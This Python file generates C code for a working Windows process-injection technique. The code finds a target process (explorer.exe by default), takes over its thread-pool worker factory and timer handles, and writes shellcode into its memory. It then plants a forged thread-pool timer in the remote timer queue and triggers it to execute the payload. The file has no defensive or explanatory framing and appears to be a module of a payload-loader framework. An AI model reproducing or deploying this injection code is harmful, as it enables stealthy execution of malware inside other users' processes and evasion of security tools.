from string import Template

from string import Template

class tp_timer:
    def __init__(self, arguments):
        self.apicallsList = []
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'explorer.exe'
        if 'target' in arguments:
            self.target = arguments['target']

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                "#include <winternl.h>",
                "#include <tlhelp32.h>"]

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return """
typedef struct _TP_TASK_CALLBACKS
{
    void* ExecuteCallback;
    void* Unposted;
} TP_TASK_CALLBACKS, * PTP_TASK_CALLBACKS;

typedef struct _TP_TASK
{
    struct _TP_TASK_CALLBACKS* Callbacks;
    UINT32 NumaNode;
    UINT8 IdealProcessor;
    char Padding_242[3];
    struct _LIST_ENTRY ListEntry;
} TP_TASK, * PTP_TASK;

typedef struct _TPP_REFCOUNT
{
    volatile INT32 Refcount;
} TPP_REFCOUNT, * PTPP_REFCOUNT;

typedef struct _TPP_CALLER
{
    void* ReturnAddress;
} TPP_CALLER, * PTPP_CALLER;

typedef struct _TPP_PH
{
    struct _TPP_PH_LINKS* Root;
} TPP_PH, * PTPP_PH;

typedef struct _TP_DIRECT
{
    struct _TP_TASK Task;
    UINT64 Lock;
    struct _LIST_ENTRY IoCompletionInformationList;
    void* Callback;
    UINT32 NumaNode;
    UINT8 IdealProcessor;
    char __PADDING__[3];
} TP_DIRECT, * PTP_DIRECT;

typedef struct _TPP_TIMER_SUBQUEUE
{
    INT64 Expiration;
    struct _TPP_PH WindowStart;
    struct _TPP_PH WindowEnd;
    void* Timer;
    void* TimerPkt;
    struct _TP_DIRECT Direct;
    UINT32 ExpirationWindow;
    INT32 __PADDING__[1];
} TPP_TIMER_SUBQUEUE, * PTPP_TIMER_SUBQUEUE;

typedef struct _TPP_TIMER_QUEUE
{
    struct _RTL_SRWLOCK Lock;
    struct _TPP_TIMER_SUBQUEUE AbsoluteQueue;
    struct _TPP_TIMER_SUBQUEUE RelativeQueue;
    INT32 AllocatedTimerCount;
    INT32 __PADDING__[1];
} TPP_TIMER_QUEUE, * PTPP_TIMER_QUEUE;

typedef struct _TPP_NUMA_NODE
{
    INT32 WorkerCount;
} TPP_NUMA_NODE, * PTPP_NUMA_NODE;

typedef union _TPP_POOL_QUEUE_STATE
{
    union
    {
        INT64 Exchange;
        struct
        {
            INT32 RunningThreadGoal : 16;
            UINT32 PendingReleaseCount : 16;
            UINT32 QueueLength;
        };
    };
} TPP_POOL_QUEUE_STATE, * PTPP_POOL_QUEUE_STATE;

typedef struct _TPP_QUEUE
{
    struct _LIST_ENTRY Queue;
    struct _RTL_SRWLOCK Lock;
} TPP_QUEUE, * PTPP_QUEUE;

typedef struct _FULL_TP_POOL
{
    struct _TPP_REFCOUNT Refcount;
    long Padding_239;
    union _TPP_POOL_QUEUE_STATE QueueState;
    struct _TPP_QUEUE* TaskQueue[3];
    struct _TPP_NUMA_NODE* NumaNode;
    struct _GROUP_AFFINITY* ProximityInfo;
    void* WorkerFactory;
    void* CompletionPort;
    struct _RTL_SRWLOCK Lock;
    struct _LIST_ENTRY PoolObjectList;
    struct _LIST_ENTRY WorkerList;
    struct _TPP_TIMER_QUEUE TimerQueue;
    struct _RTL_SRWLOCK ShutdownLock;
    UINT8 ShutdownInitiated;
    UINT8 Released;
    UINT16 PoolFlags;
    long Padding_240;
    struct _LIST_ENTRY PoolLinks;
    struct _TPP_CALLER AllocCaller;
    struct _TPP_CALLER ReleaseCaller;
    volatile INT32 AvailableWorkerCount;
    volatile INT32 LongRunningWorkerCount;
    UINT32 LastProcCount;
    volatile INT32 NodeStatus;
    volatile INT32 BindingCount;
    UINT32 CallbackChecksDisabled : 1;
    UINT32 TrimTarget : 11;
    UINT32 TrimmedThrdCount : 11;
    UINT32 SelectedCpuSetCount;
    long Padding_241;
    struct _RTL_CONDITION_VARIABLE TrimComplete;
    struct _LIST_ENTRY TrimmedWorkerList;
} FULL_TP_POOL, * PFULL_TP_POOL;

typedef struct _ALPC_WORK_ON_BEHALF_TICKET
{
    UINT32 ThreadId;
    UINT32 ThreadCreationTimeLow;
} ALPC_WORK_ON_BEHALF_TICKET, * PALPC_WORK_ON_BEHALF_TICKET;

typedef union _TPP_WORK_STATE
{
    union
    {
        INT32 Exchange;
        UINT32 Insertable : 1;
        UINT32 PendingCallbackCount : 31;
    };
} TPP_WORK_STATE, * PTPP_WORK_STATE;

typedef struct _TPP_ITE_WAITER
{
    struct _TPP_ITE_WAITER* Next;
    void* ThreadId;
} TPP_ITE_WAITER, * PTPP_ITE_WAITER;

typedef struct _TPP_PH_LINKS
{
    struct _LIST_ENTRY Siblings;
    struct _LIST_ENTRY Children;
    INT64 Key;
} TPP_PH_LINKS, * PTPP_PH_LINKS;

typedef struct _TPP_ITE
{
    struct _TPP_ITE_WAITER* First;
} TPP_ITE, * PTPP_ITE;

typedef union _TPP_FLAGS_COUNT
{
    union
    {
        UINT64 Count : 60;
        UINT64 Flags : 4;
        INT64 Data;
    };
} TPP_FLAGS_COUNT, * PTPP_FLAGS_COUNT;

typedef struct _TPP_BARRIER
{
    volatile union _TPP_FLAGS_COUNT Ptr;
    struct _RTL_SRWLOCK WaitLock;
    struct _TPP_ITE WaitList;
} TPP_BARRIER, * PTPP_BARRIER;

typedef struct _TP_CLEANUP_GROUP
{
    struct _TPP_REFCOUNT Refcount;
    INT32 Released;
    struct _RTL_SRWLOCK MemberLock;
    struct _LIST_ENTRY MemberList;
    struct _TPP_BARRIER Barrier;
    struct _RTL_SRWLOCK CleanupLock;
    struct _LIST_ENTRY CleanupList;
} TP_CLEANUP_GROUP, * PTP_CLEANUP_GROUP;


typedef struct _TPP_CLEANUP_GROUP_MEMBER
{
    struct _TPP_REFCOUNT Refcount;
    long Padding_233;
    const struct _TPP_CLEANUP_GROUP_MEMBER_VFUNCS* VFuncs;
    struct _TP_CLEANUP_GROUP* CleanupGroup;
    void* CleanupGroupCancelCallback;
    void* FinalizationCallback;
    struct _LIST_ENTRY CleanupGroupMemberLinks;
    struct _TPP_BARRIER CallbackBarrier;
    union
    {
        void* Callback;
        void* WorkCallback;
        void* SimpleCallback;
        void* TimerCallback;
        void* WaitCallback;
        void* IoCallback;
        void* AlpcCallback;
        void* AlpcCallbackEx;
        void* JobCallback;
    };
    void* Context;
    struct _ACTIVATION_CONTEXT* ActivationContext;
    void* SubProcessTag;
    struct _GUID ActivityId;
    struct _ALPC_WORK_ON_BEHALF_TICKET WorkOnBehalfTicket;
    void* RaceDll;
    FULL_TP_POOL* Pool;
    struct _LIST_ENTRY PoolObjectLinks;
    union
    {
        volatile INT32 Flags;
        UINT32 LongFunction : 1;
        UINT32 Persistent : 1;
        UINT32 UnusedPublic : 14;
        UINT32 Released : 1;
        UINT32 CleanupGroupReleased : 1;
        UINT32 InCleanupGroupCleanupList : 1;
        UINT32 UnusedPrivate : 13;
    };
    long Padding_234;
    struct _TPP_CALLER AllocCaller;
    struct _TPP_CALLER ReleaseCaller;
    enum _TP_CALLBACK_PRIORITY CallbackPriority;
    INT32 __PADDING__[1];
} TPP_CLEANUP_GROUP_MEMBER, * PTPP_CLEANUP_GROUP_MEMBER;

typedef struct _FULL_TP_WORK
{
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    struct _TP_TASK Task;
    volatile union _TPP_WORK_STATE WorkState;
    INT32 __PADDING__[1];
} FULL_TP_WORK, * PFULL_TP_WORK;

typedef struct _FULL_TP_TIMER
{
    struct _FULL_TP_WORK Work;
    struct _RTL_SRWLOCK Lock;
    union
    {
        struct _TPP_PH_LINKS WindowEndLinks;
        struct _LIST_ENTRY ExpirationLinks;
    };
    struct _TPP_PH_LINKS WindowStartLinks;
    INT64 DueTime;
    struct _TPP_ITE Ite;
    UINT32 Window;
    UINT32 Period;
    UINT8 Inserted;
    UINT8 WaitTimer;
    union
    {
        UINT8 TimerStatus;
        UINT8 InQueue : 1;
        UINT8 Absolute : 1;
        UINT8 Cancelled : 1;
    };
    UINT8 BlockInsert;
    INT32 __PADDING__[1];
} FULL_TP_TIMER, * PFULL_TP_TIMER;

typedef struct _T2_SET_PARAMETERS_V0
{
    ULONG Version;
    ULONG Reserved;
    LONGLONG NoWakeTolerance;
} T2_SET_PARAMETERS, * PT2_SET_PARAMETERS;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[ANYSIZE_ARRAY];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

#define ProcessHandleInformation            51
#define STATUS_INFO_LENGTH_MISMATCH         0xC0000004
#define ObjectTypeInformation               2
#define WorkerFactoryBasicInformation       7
#define WORKER_FACTORY_RELEASE_WORKER       0x0001
#define WORKER_FACTORY_WAIT                 0x0002
#define WORKER_FACTORY_SET_INFORMATION      0x0004
#define WORKER_FACTORY_QUERY_INFORMATION    0x0008
#define WORKER_FACTORY_READY_WORKER         0x0010
#define WORKER_FACTORY_SHUTDOWN             0x0020
#define WORKER_FACTORY_ALL_ACCESS ( \
       STANDARD_RIGHTS_REQUIRED | \
       WORKER_FACTORY_RELEASE_WORKER | \
       WORKER_FACTORY_WAIT | \
       WORKER_FACTORY_SET_INFORMATION | \
       WORKER_FACTORY_QUERY_INFORMATION | \
       WORKER_FACTORY_READY_WORKER | \
       WORKER_FACTORY_SHUTDOWN \
)

typedef struct _WORKER_FACTORY_BASIC_INFORMATION
{
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN Shutdown;
    ULONG BindingCount;
    ULONG ThreadMinimum;
    ULONG ThreadMaximum;
    ULONG PendingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;
    PVOID StartParameter;
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, * PWORKER_FACTORY_BASIC_INFORMATION;

#define WIN32_FUNC( x )     __typeof__( x ) * x

typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
    HANDLE                   ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID                    ProcessInformation,
    ULONG                    ProcessInformationLength,
    PULONG                   ReturnLength
);

typedef NTSTATUS (NTAPI *pfnNtQueryObject)(
    HANDLE                   Handle,
    OBJECT_INFORMATION_CLASS ObjectInformationClass,
    PVOID                    ObjectInformation,
    ULONG                    ObjectInformationLength,
    PULONG                   ReturnLength
);

typedef NTSTATUS (NTAPI *pfnNtSetTimer2)(
    HANDLE TimerHandle,
    PLARGE_INTEGER DueTime,
    PLARGE_INTEGER Period,        // _In_opt_
    PVOID Parameters              // _In_ PT2_SET_PARAMETERS
);

typedef NTSTATUS (NTAPI *pfnNtQueryInformationWorkerFactory)(
    HANDLE WorkerFactoryHandle,
    int WorkerFactoryInformationClass, // _In_ WORKERFACTORYINFOCLASS
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength,
    PULONG ReturnLength           // _Out_opt_
);

HANDLE GetHandle( DWORD PID, LPWSTR HandleName, SIZE_T Access )
{
    HANDLE hProcess         = NULL;
    NTSTATUS Status         = { 0 };
    DWORD szInformation     = 0;
    HANDLE hDupObject       = NULL;

    PPUBLIC_OBJECT_TYPE_INFORMATION      ObjectInformation = NULL;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION ProcessHandleInfo = NULL;

    pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueryInformationProcess" );
    pfnNtQueryObject NtQueryObject             = (pfnNtQueryObject)GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueryObject" );

    // Principle of least privilege... for our handles.
    //printf( "%S\\n", HandleName );
    if ( !wcscmp( HandleName, L"Process" ) ) 
        hProcess = OpenProcess( PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, PID );
    else
        hProcess = OpenProcess( PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, PID );

    if ( hProcess == INVALID_HANDLE_VALUE || !hProcess ) {
        printf( "OpenProcess error: 0x%llx\\n", GetLastError() );
        return NULL;
    }
    
    if ( hProcess && !wcscmp( HandleName, L"Process" ) )
        return hProcess;

    do {
        ProcessHandleInfo = realloc( ProcessHandleInfo, szInformation );
        Status = NtQueryInformationProcess( hProcess, ProcessHandleInformation, ProcessHandleInfo, szInformation, &szInformation );
        if ( Status && Status != STATUS_INFO_LENGTH_MISMATCH ) {
            printf( "Error querying target process's handle table: 0x%llx\\n", Status );
        }
    } while ( Status == STATUS_INFO_LENGTH_MISMATCH );

    for ( DWORD i = 0; i < ProcessHandleInfo->NumberOfHandles; i++ ) {
        
        Status = DuplicateHandle( hProcess, ProcessHandleInfo->Handles[i].HandleValue, (HANDLE)-1, &hDupObject, Access, 0, 0 );

        if ( !Status )
            continue;

        szInformation = 0;

        do {
            ObjectInformation = realloc( ObjectInformation, szInformation );
            Status = NtQueryObject( hDupObject, ObjectTypeInformation, ObjectInformation, szInformation, &szInformation );
        } while ( Status == STATUS_INFO_LENGTH_MISMATCH );

        if ( !wcscmp( ObjectInformation->TypeName.Buffer, HandleName ) ) {
            CloseHandle( hProcess );
            return hDupObject;
        }

        CloseHandle( hDupObject );

    }
    if ( hProcess && hProcess != (HANDLE)-1 )
        CloseHandle( hProcess );
    if ( hDupObject )
        CloseHandle( hDupObject );
    return NULL;
    
}

"""

    def apicalls(self) -> list[str]:
        return self.apicallsList

    def template(self) -> str:
        return Template("""

    DWORD PID = 0;

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
            
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!Process32First(hProcSnap, &pe32)) {{
            CloseHandle(hProcSnap);
            return 0;
    }}
            
    while (Process32Next(hProcSnap, &pe32)) {{
        if (lstrcmpiA("$target", pe32.szExeFile) == 0) {{
                PID = pe32.th32ProcessID;
                break;
        }}
    }}
            
    CloseHandle(hProcSnap);


    {transformers}
    
    HANDLE hProcess = NULL;
    HANDLE hFactory = NULL;
    HANDLE hTimerQ  = NULL;

    BOOL        Status      = 0;
    PVOID       BaseAddress = NULL;
    SIZE_T      RegionSize  = 0;
    DWORD       OldProtect  = 0;

    WORKER_FACTORY_BASIC_INFORMATION FactoryInfo  = {{ 0 }};
    PFULL_TP_TIMER                   TpTimer      = NULL;
    PFULL_TP_TIMER                   TimerAddress = NULL;
    PVOID                            StartLink    = NULL;
    PVOID                            EndLink      = NULL;
    DWORD                            SzTimer      = sizeof( FULL_TP_TIMER );
    LARGE_INTEGER                    li           = {{ 0 }};
    T2_SET_PARAMETERS                TimerParams  = {{ 0 }};

    pfnNtSetTimer2 NtSetTimer2 = (pfnNtSetTimer2)GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtSetTimer2" );
    pfnNtQueryInformationWorkerFactory NtQueryInformationWorkerFactory = (pfnNtQueryInformationWorkerFactory)GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueryInformationWorkerFactory" );

    // Get Handles
    hProcess    = GetHandle( PID, L"Process", PROCESS_ALL_ACCESS );
    hFactory    = GetHandle( PID, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS );
    hTimerQ     = GetHandle( PID, L"IRTimer", TIMER_ALL_ACCESS );

    // Allocate space for the payload
    RegionSize = {shellcodeSize};
    BaseAddress = VirtualAllocEx( hProcess, NULL, {shellcodeSize}, MEM_COMMIT, PAGE_READWRITE );
    printf( "Allocated 0x%llx bytes to: 0x%llx\\n", {shellcodeSize}, BaseAddress );

    // Write the payload
    Status     = WriteProcessMemory( hProcess, BaseAddress, shellcode, {shellcodeSize}, NULL );
    printf( "Wrote payload in successfully!\\n" );

    // Get WorkerFactoryBasicInformation so we can obtain the StartParameter
    Status     = NtQueryInformationWorkerFactory( hFactory, WorkerFactoryBasicInformation, &FactoryInfo, sizeof(FactoryInfo), NULL );
    printf( "Queried Worker Factory information successfully!\\n" );

    // Make payload executable
    Status      = VirtualProtectEx( hProcess, BaseAddress, RegionSize, PAGE_EXECUTE_READ, &OldProtect );

    // Create a timer in our local process
    TpTimer     = (PFULL_TP_TIMER)CreateThreadpoolTimer( BaseAddress, NULL, NULL );

    // Allocate space for the timer
    RegionSize     = SzTimer;
    TimerAddress   = VirtualAllocEx( hProcess, TimerAddress, RegionSize, MEM_COMMIT, PAGE_READWRITE );
    printf( "Allocated 0x%llx bytes to: 0x%llx\\n", RegionSize, TimerAddress );

    // Rebase the pointers of the timer to be based on the remote allocation we made
    TpTimer->Work.CleanupGroupMember.Pool    = FactoryInfo.StartParameter; // Remote process's pool
    TpTimer->DueTime                         =  -10000000;
    TpTimer->WindowStartLinks.Key            =  -10000000;
    TpTimer->WindowEndLinks.Key              =  -10000000;
    TpTimer->WindowStartLinks.Children.Flink = &TimerAddress->WindowStartLinks.Children;
    TpTimer->WindowStartLinks.Children.Blink = &TimerAddress->WindowStartLinks.Children;
    TpTimer->WindowEndLinks.Children.Flink   = &TimerAddress->WindowEndLinks.Children;
    TpTimer->WindowEndLinks.Children.Blink   = &TimerAddress->WindowEndLinks.Children;

    StartLink  = &TimerAddress->WindowStartLinks;
    EndLink    = &TimerAddress->WindowEndLinks;

    // Write the timer in
    Status     = WriteProcessMemory( hProcess, TimerAddress, TpTimer, SzTimer, NULL );
    if ( !Status ) {{
        printf( "Error writing timer to target process: 0x%llx\\n", GetLastError() );
    }}
    printf( "Wrote timer in successfully!\\n" );

    // Insert our timer's start and end links into the remote process's timer queue
    Status     = WriteProcessMemory( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root, &StartLink, sizeof( PVOID ), NULL );
    if ( !Status ) {{
        printf( "Error overwriting WindowStart.Root in target process: 0x%llx\\n", GetLastError() );
    }}

    // Insert our timer's start and end links into the remote process's timer queue
    Status     = WriteProcessMemory( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, &EndLink, sizeof( PVOID ), NULL );
    if ( !Status ) {{
        printf( "Error overwriting WindowEnd.Root in target process: 0x%llx\\n", GetLastError() );
    }}

    li.QuadPart = -10000000;

    // Signal the remote process's timer queue to execute our payload
    Status      = NtSetTimer2( hTimerQ, &li, NULL, &TimerParams );
    if ( Status ) {{
        printf( "Error signalling timer in target process: 0x%llx\\n", Status );
    }}
    printf( "Payload executed\\n" );

    Sleep(10000000000000);


    if ( hFactory ) {{
        CloseHandle( hFactory );
    }}
    if ( hTimerQ ) {{
        CloseHandle( hTimerQ );
    }}
    if ( hProcess ) {{
        CloseHandle( hProcess );
    }}
""").substitute(target=self.target)